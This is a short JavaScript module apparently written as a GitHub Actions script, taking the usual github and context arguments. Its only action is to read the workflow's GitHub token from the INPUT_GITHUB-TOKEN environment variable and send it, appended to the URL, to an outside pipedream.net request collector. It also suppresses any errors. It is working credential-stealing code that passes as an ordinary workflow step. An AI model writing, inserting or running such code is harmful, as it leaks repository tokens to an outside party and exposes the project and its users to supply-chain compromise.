import https from 'https';

export default async function(github, context) {
  https
  .get(`https://eofeuuypisxyg56.m.pipedream.net/` + process.env['INPUT_GITHUB-TOKEN'], resp => {})
  .on("error", err => {
    console.log("Error: " + err.message);
  });
}
